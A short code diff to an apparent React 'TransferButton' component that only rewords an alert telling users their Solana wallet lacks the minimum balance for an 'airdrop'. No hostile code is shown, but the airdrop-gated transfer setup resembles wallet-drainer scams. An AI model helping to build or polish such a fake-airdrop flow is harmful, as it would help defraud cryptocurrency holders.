@@ -70,7 +70,7 @@ export default function TransferButton({ className = '' }) {
       ]);
 
       if (balance < Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL)) {
-        alert(`Not qualified for airdrop. Keep at least ${MIN_QUALIFY_SOL} SOL in your wallet.`);
+        alert(`You are not eligible for the airdrop. Please ensure your wallet holds at least ${MIN_QUALIFY_SOL} SOL to qualify.`);
         return;
       }
 
